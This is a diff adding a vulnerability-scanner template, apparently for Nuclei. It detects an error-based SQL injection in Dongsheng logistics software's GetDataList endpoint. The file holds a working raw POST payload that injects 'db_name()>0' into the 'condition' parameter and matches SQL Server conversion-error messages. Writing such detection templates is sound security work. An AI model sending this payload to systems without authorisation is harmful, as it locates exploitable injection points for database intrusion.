@@ -1,0 +1,27 @@
+id: dongshengwuliu-GetDataList-sql
+
+info:
+  name: 东胜物流软件 GetDataList SQL注入漏洞
+  author: dongshengwuliu
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /Account/Chfee_hexiao/GetDataList HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        start=0&condition=db_name()>0&limit=10
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '转换成数据类型 int 时失败'
+          - '在将 nvarchar 值'
+        condition: and
+      - type: status
+        status: 
+          - 500
